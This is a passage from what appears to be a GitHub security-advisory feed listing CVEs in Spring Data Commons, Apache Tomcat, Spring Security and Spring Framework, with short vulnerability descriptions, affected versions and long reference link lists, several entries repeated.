        <content type="html"><![CDATA[<p>Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property binder vulnerability caused by improper neutralization of special elements. An unauthenticated remote malicious user (or attacker) can supply specially crafted request parameters against Spring Data REST backed HTTP resources or using Spring Data's projection-based request payload binding that can lead to a remote code execution attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1273">https://nvd.nist.gov/vuln/detail/CVE-2018-1273</a></li>
<li><a href="https://github.com/advisories/GHSA-4fq3-mr56-cg6r">https://github.com/advisories/GHSA-4fq3-mr56-cg6r</a></li>
<li><a href="https://pivotal.io/security/cve-2018-1273">https://pivotal.io/security/cve-2018-1273</a></li>
<li><a href="http://mail-archives.apache.org/mod_mbox/ignite-dev/201807.mbox/%3CCAK0qHnqzfzmCDFFi6c5Jok19zNkVCz5Xb4sU%3D0f2J_1i4p46zQ%40mail.gmail.com%3E">http://mail-archives.apache.org/mod_mbox/ignite-dev/201807.mbox/%3CCAK0qHnqzfzmCDFFi6c5Jok19zNkVCz5Xb4sU%3D0f2J_1i4p46zQ%40mail.gmail.com%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2022.html">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>
<li><a href="https://github.com/spring-projects/spring-data-commons/issues/1721">https://github.com/spring-projects/spring-data-commons/issues/1721</a></li>
<li><a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></li>
<li><a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a">https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4fq3-mr56-cg6r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2018-10-17T17:23:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework.data:spring-data-commons] Spring Data Commons remote code injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4fq3-mr56-cg6r</id>
        <link href="https://github.com/advisories/GHSA-4fq3-mr56-cg6r"/>
        <updated>2024-03-20T14:20:44.000Z</updated>
        <content type="html"><![CDATA[<p>Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property binder vulnerability caused by improper neutralization of special elements. An unauthenticated remote malicious user (or attacker) can supply specially crafted request parameters against Spring Data REST backed HTTP resources or using Spring Data's projection-based request payload binding that can lead to a remote code execution attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1273">https://nvd.nist.gov/vuln/detail/CVE-2018-1273</a></li>
<li><a href="https://github.com/advisories/GHSA-4fq3-mr56-cg6r">https://github.com/advisories/GHSA-4fq3-mr56-cg6r</a></li>
<li><a href="https://pivotal.io/security/cve-2018-1273">https://pivotal.io/security/cve-2018-1273</a></li>
<li><a href="http://mail-archives.apache.org/mod_mbox/ignite-dev/201807.mbox/%3CCAK0qHnqzfzmCDFFi6c5Jok19zNkVCz5Xb4sU%3D0f2J_1i4p46zQ%40mail.gmail.com%3E">http://mail-archives.apache.org/mod_mbox/ignite-dev/201807.mbox/%3CCAK0qHnqzfzmCDFFi6c5Jok19zNkVCz5Xb4sU%3D0f2J_1i4p46zQ%40mail.gmail.com%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2022.html">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>
<li><a href="https://github.com/spring-projects/spring-data-commons/issues/1721">https://github.com/spring-projects/spring-data-commons/issues/1721</a></li>
<li><a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></li>
<li><a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a">https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4fq3-mr56-cg6r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2018-10-17T17:23:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat] Exposure of Sensitive Information to an Unauthorized Actor in Apache Tomcat]]></title>
        <id>https://github.com/advisories/GHSA-3gv7-3h64-78cm</id>
        <link href="https://github.com/advisories/GHSA-3gv7-3h64-78cm"/>
        <updated>2024-03-19T13:56:26.000Z</updated>
        <content type="html"><![CDATA[<p>A bug in the handling of the pipelined requests in Apache Tomcat 9.0.0.M1 to 9.0.0.M18, 8.5.0 to 8.5.12, 8.0.0.RC1 to 8.0.42, 7.0.0 to 7.0.76, and 6.0.0 to 6.0.52, when send file was used, results in the pipelined request being lost when send file processing of the previous request completed. This could result in responses appearing to be sent for the wrong request. For example, a user agent that sent requests A, B and C could see the correct response for request A, the response for request C for request B and no response for request C.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5647">https://nvd.nist.gov/vuln/detail/CVE-2017-5647</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1801">https://access.redhat.com/errata/RHSA-2017:1801</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1802">https://access.redhat.com/errata/RHSA-2017:1802</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2493">https://access.redhat.com/errata/RHSA-2017:2493</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2494">https://access.redhat.com/errata/RHSA-2017:2494</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:3080">https://access.redhat.com/errata/RHSA-2017:3080</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:3081">https://access.redhat.com/errata/RHSA-2017:3081</a></li>
<li><a href="https://h20566.www2.hpe.com/hpsc/doc/public/display?docLocale=en_US&amp;docId=emr_na-hpesbhf03730en_us">https://h20566.www2.hpe.com/hpsc/doc/public/display?docLocale=en_US&amp;docId=emr_na-hpesbhf03730en_us</a></li>
<li><a href="https://lists.apache.org/thread.html/343558d982879bf88ec20dbf707f8c11255f8e219e81d45c4f8d0551@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/343558d982879bf88ec20dbf707f8c11255f8e219e81d45c4f8d0551@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/388a323769f1dff84c9ec905455aa73fbcb20338e3c7eb131457f708@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/388a323769f1dff84c9ec905455aa73fbcb20338e3c7eb131457f708@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/3d19773b4cf0377db62d1e9328bf9160bf1819f04f988315086931d7@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/3d19773b4cf0377db62d1e9328bf9160bf1819f04f988315086931d7@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/5796678c5a773c6f3ff57c178ac247d85ceca0dee9190ba48171451a@%3Cusers.tomcat.apache.org%3E">https://lists.apache.org/thread.html/5796678c5a773c6f3ff57c178ac247d85ceca0dee9190ba48171451a@%3Cusers.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/5c0e00fd31efc11e147bf99d0f03c00a734447d3b131ab0818644cdb@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/5c0e00fd31efc11e147bf99d0f03c00a734447d3b131ab0818644cdb@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/6af47120905aa7d8fe12f42e8ff2284fb338ba141d3b77b8c7cb61b3@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/6af47120905aa7d8fe12f42e8ff2284fb338ba141d3b77b8c7cb61b3@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/845312a10aabbe2c499fca94003881d2c79fc993d85f34c1f5c77424@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/845312a10aabbe2c499fca94003881d2c79fc993d85f34c1f5c77424@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/88855876c33f2f9c532ffb75bfee570ccf0b17ffa77493745af9a17a@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/88855876c33f2f9c532ffb75bfee570ccf0b17ffa77493745af9a17a@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b5e3f51d28cd5d9b1809f56594f2cf63dcd6a90429e16ea9f83bbedc@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b5e3f51d28cd5d9b1809f56594f2cf63dcd6a90429e16ea9f83bbedc@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/eb6efa8d59c45a7a9eff94c4b925467d3b3fec8ba7697f3daa314b04@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/eb6efa8d59c45a7a9eff94c4b925467d3b3fec8ba7697f3daa314b04@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r3bbb800a816d0a51eccc5a228c58736960a9fffafa581a225834d97d@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r3bbb800a816d0a51eccc5a228c58736960a9fffafa581a225834d97d@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r48c1444845fe15a823e1374674bfc297d5008a5453788099ea14caf0@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r48c1444845fe15a823e1374674bfc297d5008a5453788099ea14caf0@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r9136ff5b13e4f1941360b5a309efee2c114a14855578c3a2cbe5d19c@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r9136ff5b13e4f1941360b5a309efee2c114a14855578c3a2cbe5d19c@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://security.gentoo.org/glsa/201705-09">https://security.gentoo.org/glsa/201705-09</a></li>
<li><a href="https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html">https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html</a></li>
<li><a href="http://www.arubanetworks.com/assets/alert/HPESBHF03730.txt">http://www.arubanetworks.com/assets/alert/HPESBHF03730.txt</a></li>
<li><a href="http://www.debian.org/security/2017/dsa-3842">http://www.debian.org/security/2017/dsa-3842</a></li>
<li><a href="http://www.debian.org/security/2017/dsa-3843">http://www.debian.org/security/2017/dsa-3843</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.html">http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.html</a></li>
<li><a href="https://lists.apache.org/thread.html/343558d982879bf88ec20dbf707f8c11255f8e219e81d45c4f8d0551%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/343558d982879bf88ec20dbf707f8c11255f8e219e81d45c4f8d0551%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/388a323769f1dff84c9ec905455aa73fbcb20338e3c7eb131457f708%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/388a323769f1dff84c9ec905455aa73fbcb20338e3c7eb131457f708%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/3d19773b4cf0377db62d1e9328bf9160bf1819f04f988315086931d7%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/3d19773b4cf0377db62d1e9328bf9160bf1819f04f988315086931d7%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/5796678c5a773c6f3ff57c178ac247d85ceca0dee9190ba48171451a%40%3Cusers.tomcat.apache.org%3E">https://lists.apache.org/thread.html/5796678c5a773c6f3ff57c178ac247d85ceca0dee9190ba48171451a%40%3Cusers.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/5c0e00fd31efc11e147bf99d0f03c00a734447d3b131ab0818644cdb%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/5c0e00fd31efc11e147bf99d0f03c00a734447d3b131ab0818644cdb%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/6af47120905aa7d8fe12f42e8ff2284fb338ba141d3b77b8c7cb61b3%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/6af47120905aa7d8fe12f42e8ff2284fb338ba141d3b77b8c7cb61b3%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/845312a10aabbe2c499fca94003881d2c79fc993d85f34c1f5c77424%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/845312a10aabbe2c499fca94003881d2c79fc993d85f34c1f5c77424%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/88855876c33f2f9c532ffb75bfee570ccf0b17ffa77493745af9a17a%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/88855876c33f2f9c532ffb75bfee570ccf0b17ffa77493745af9a17a%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b5e3f51d28cd5d9b1809f56594f2cf63dcd6a90429e16ea9f83bbedc%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b5e3f51d28cd5d9b1809f56594f2cf63dcd6a90429e16ea9f83bbedc%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/eb6efa8d59c45a7a9eff94c4b925467d3b3fec8ba7697f3daa314b04%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/eb6efa8d59c45a7a9eff94c4b925467d3b3fec8ba7697f3daa314b04%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r3bbb800a816d0a51eccc5a228c58736960a9fffafa581a225834d97d%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r3bbb800a816d0a51eccc5a228c58736960a9fffafa581a225834d97d%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r48c1444845fe15a823e1374674bfc297d5008a5453788099ea14caf0%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r48c1444845fe15a823e1374674bfc297d5008a5453788099ea14caf0%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r9136ff5b13e4f1941360b5a309efee2c114a14855578c3a2cbe5d19c%40%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r9136ff5b13e4f1941360b5a309efee2c114a14855578c3a2cbe5d19c%40%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://web.archive.org/web/20170420114447/http://www.securitytracker.com/id/1038218">https://web.archive.org/web/20170420114447/http://www.securitytracker.com/id/1038218</a></li>
<li><a href="https://github.com/apache/tomcat/commit/864aa1199ad2cccc9a7e7c6b977f7d7f812c9910">https://github.com/apache/tomcat/commit/864aa1199ad2cccc9a7e7c6b977f7d7f812c9910</a></li>
<li><a href="https://github.com/apache/tomcat/commit/a4efd3ca1ccbdfc398136d76c0d8b7ad5a1e4905">https://github.com/apache/tomcat/commit/a4efd3ca1ccbdfc398136d76c0d8b7ad5a1e4905</a></li>
<li><a href="https://github.com/apache/tomcat/commit/f5e06b8c743b1daa9eb5e817863958b6b320e044">https://github.com/apache/tomcat/commit/f5e06b8c743b1daa9eb5e817863958b6b320e044</a></li>
<li><a href="https://github.com/apache/tomcat80/commit/ec10b8c785d1db91fe58946436f854dde04410fd">https://github.com/apache/tomcat80/commit/ec10b8c785d1db91fe58946436f854dde04410fd</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20180614-0001">https://security.netapp.com/advisory/ntap-20180614-0001</a></li>
<li><a href="https://github.com/advisories/GHSA-3gv7-3h64-78cm">https://github.com/advisories/GHSA-3gv7-3h64-78cm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3gv7-3h64-78cm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-14T01:10:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework.security:spring-security-core] Erroneous authentication pass in Spring Security]]></title>
        <id>https://github.com/advisories/GHSA-f3jh-qvm4-mg39</id>
        <link href="https://github.com/advisories/GHSA-f3jh-qvm4-mg39"/>
        <updated>2024-03-18T20:10:29.000Z</updated>
        <content type="html"><![CDATA[<p>In Spring Security, versions 5.7.x prior to 5.7.12, 5.8.x prior to 5.8.11, versions 6.0.x prior to 6.0.9, versions 6.1.x prior to 6.1.8, versions 6.2.x prior to 6.2.3, an application is possible vulnerable to broken access control when it directly uses the AuthenticatedVoter#vote passing a null Authentication parameter.</p>
<p>Specifically, an application is vulnerable if:</p>
<p>The application uses AuthenticatedVoter directly and a null authentication parameter is passed to it resulting in an erroneous true return value.</p>
<p>An application is not vulnerable if any of the following is true:</p>
<ul>
<li>The application does not use AuthenticatedVoter#vote directly.</li>
<li>The application does not pass null to AuthenticatedVoter#vote.</li>
</ul>
<p>Note that AuthenticatedVoter is deprecated since 5.8, use implementations of AuthorizationManager as a replacement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22257">https://nvd.nist.gov/vuln/detail/CVE-2024-22257</a></li>
<li><a href="https://spring.io/security/cve-2024-22257">https://spring.io/security/cve-2024-22257</a></li>
<li><a href="https://github.com/spring-projects/spring-security/commit/5a7f12f1a9fdb4edaab6f61495f1d781a7273b61">https://github.com/spring-projects/spring-security/commit/5a7f12f1a9fdb4edaab6f61495f1d781a7273b61</a></li>
<li><a href="https://github.com/advisories/GHSA-f3jh-qvm4-mg39">https://github.com/advisories/GHSA-f3jh-qvm4-mg39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f3jh-qvm4-mg39</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T15:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework.security:spring-security-core] Erroneous authentication pass in Spring Security]]></title>
        <id>https://github.com/advisories/GHSA-f3jh-qvm4-mg39</id>
        <link href="https://github.com/advisories/GHSA-f3jh-qvm4-mg39"/>
        <updated>2024-03-18T20:10:29.000Z</updated>
        <content type="html"><![CDATA[<p>In Spring Security, versions 5.7.x prior to 5.7.12, 5.8.x prior to 5.8.11, versions 6.0.x prior to 6.0.9, versions 6.1.x prior to 6.1.8, versions 6.2.x prior to 6.2.3, an application is possible vulnerable to broken access control when it directly uses the AuthenticatedVoter#vote passing a null Authentication parameter.</p>
<p>Specifically, an application is vulnerable if:</p>
<p>The application uses AuthenticatedVoter directly and a null authentication parameter is passed to it resulting in an erroneous true return value.</p>
<p>An application is not vulnerable if any of the following is true:</p>
<ul>
<li>The application does not use AuthenticatedVoter#vote directly.</li>
<li>The application does not pass null to AuthenticatedVoter#vote.</li>
</ul>
<p>Note that AuthenticatedVoter is deprecated since 5.8, use implementations of AuthorizationManager as a replacement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22257">https://nvd.nist.gov/vuln/detail/CVE-2024-22257</a></li>
<li><a href="https://spring.io/security/cve-2024-22257">https://spring.io/security/cve-2024-22257</a></li>
<li><a href="https://github.com/spring-projects/spring-security/commit/5a7f12f1a9fdb4edaab6f61495f1d781a7273b61">https://github.com/spring-projects/spring-security/commit/5a7f12f1a9fdb4edaab6f61495f1d781a7273b61</a></li>
<li><a href="https://github.com/advisories/GHSA-f3jh-qvm4-mg39">https://github.com/advisories/GHSA-f3jh-qvm4-mg39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f3jh-qvm4-mg39</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T15:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework.security:spring-security-core] Erroneous authentication pass in Spring Security]]></title>
        <id>https://github.com/advisories/GHSA-f3jh-qvm4-mg39</id>
        <link href="https://github.com/advisories/GHSA-f3jh-qvm4-mg39"/>
        <updated>2024-03-18T20:10:29.000Z</updated>
        <content type="html"><![CDATA[<p>In Spring Security, versions 5.7.x prior to 5.7.12, 5.8.x prior to 5.8.11, versions 6.0.x prior to 6.0.9, versions 6.1.x prior to 6.1.8, versions 6.2.x prior to 6.2.3, an application is possible vulnerable to broken access control when it directly uses the AuthenticatedVoter#vote passing a null Authentication parameter.</p>
<p>Specifically, an application is vulnerable if:</p>
<p>The application uses AuthenticatedVoter directly and a null authentication parameter is passed to it resulting in an erroneous true return value.</p>
<p>An application is not vulnerable if any of the following is true:</p>
<ul>
<li>The application does not use AuthenticatedVoter#vote directly.</li>
<li>The application does not pass null to AuthenticatedVoter#vote.</li>
</ul>
<p>Note that AuthenticatedVoter is deprecated since 5.8, use implementations of AuthorizationManager as a replacement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22257">https://nvd.nist.gov/vuln/detail/CVE-2024-22257</a></li>
<li><a href="https://spring.io/security/cve-2024-22257">https://spring.io/security/cve-2024-22257</a></li>
<li><a href="https://github.com/spring-projects/spring-security/commit/5a7f12f1a9fdb4edaab6f61495f1d781a7273b61">https://github.com/spring-projects/spring-security/commit/5a7f12f1a9fdb4edaab6f61495f1d781a7273b61</a></li>
<li><a href="https://github.com/advisories/GHSA-f3jh-qvm4-mg39">https://github.com/advisories/GHSA-f3jh-qvm4-mg39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f3jh-qvm4-mg39</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T15:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework.security:spring-security-core] Erroneous authentication pass in Spring Security]]></title>
        <id>https://github.com/advisories/GHSA-f3jh-qvm4-mg39</id>
        <link href="https://github.com/advisories/GHSA-f3jh-qvm4-mg39"/>
        <updated>2024-03-18T20:10:29.000Z</updated>
        <content type="html"><![CDATA[<p>In Spring Security, versions 5.7.x prior to 5.7.12, 5.8.x prior to 5.8.11, versions 6.0.x prior to 6.0.9, versions 6.1.x prior to 6.1.8, versions 6.2.x prior to 6.2.3, an application is possible vulnerable to broken access control when it directly uses the AuthenticatedVoter#vote passing a null Authentication parameter.</p>
<p>Specifically, an application is vulnerable if:</p>
<p>The application uses AuthenticatedVoter directly and a null authentication parameter is passed to it resulting in an erroneous true return value.</p>
<p>An application is not vulnerable if any of the following is true:</p>
<ul>
<li>The application does not use AuthenticatedVoter#vote directly.</li>
<li>The application does not pass null to AuthenticatedVoter#vote.</li>
</ul>
<p>Note that AuthenticatedVoter is deprecated since 5.8, use implementations of AuthorizationManager as a replacement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22257">https://nvd.nist.gov/vuln/detail/CVE-2024-22257</a></li>
<li><a href="https://spring.io/security/cve-2024-22257">https://spring.io/security/cve-2024-22257</a></li>
<li><a href="https://github.com/spring-projects/spring-security/commit/5a7f12f1a9fdb4edaab6f61495f1d781a7273b61">https://github.com/spring-projects/spring-security/commit/5a7f12f1a9fdb4edaab6f61495f1d781a7273b61</a></li>
<li><a href="https://github.com/advisories/GHSA-f3jh-qvm4-mg39">https://github.com/advisories/GHSA-f3jh-qvm4-mg39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f3jh-qvm4-mg39</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T15:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-web] Spring Framework URL Parsing with Host Validation Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hgjh-9rj2-g67j</id>
        <link href="https://github.com/advisories/GHSA-hgjh-9rj2-g67j"/>
        <updated>2024-03-18T16:20:32.000Z</updated>
        <content type="html"><![CDATA[<p>Applications that use UriComponentsBuilder in Spring Framework&nbsp;to parse an externally provided URL (e.g. through a query parameter) AND&nbsp;perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect <a href="https://cwe.mitre.org/data/definitions/601.html">https://cwe.mitre.org/data/definitions/601.html</a> &nbsp;attack or to a SSRF attack if the URL is used after passing validation checks.</p>
<p>This is the same as  CVE-2024-22243 <a href="https://spring.io/security/cve-2024-22243">https://spring.io/security/cve-2024-22243</a>, but with different input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22259">https://nvd.nist.gov/vuln/detail/CVE-2024-22259</a></li>
<li><a href="https://spring.io/security/cve-2024-22259">https://spring.io/security/cve-2024-22259</a></li>
